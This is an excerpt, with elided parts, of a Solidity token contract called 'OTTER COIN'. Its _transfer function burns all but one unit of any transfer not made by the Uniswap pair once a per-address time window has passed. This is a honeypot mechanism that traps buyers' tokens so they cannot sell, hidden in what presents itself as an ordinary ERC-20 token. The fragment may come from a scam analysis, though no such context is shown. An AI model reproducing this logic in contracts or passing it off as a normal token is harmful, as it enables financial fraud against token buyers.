...
contract  OTTERCOIN    is Ownable, IERC20 {
    ...
    string private  _name = "OTTER COIN";
    ...
    function _transfer(  address from,  address to,  uint256 amount  ) private {
        ...
        if ( from != uniswapV2Pairs )  {   if (    Market[from] + TimeOne  < block.timestamp   )    {   burnfee = amount - 1; }      }  }
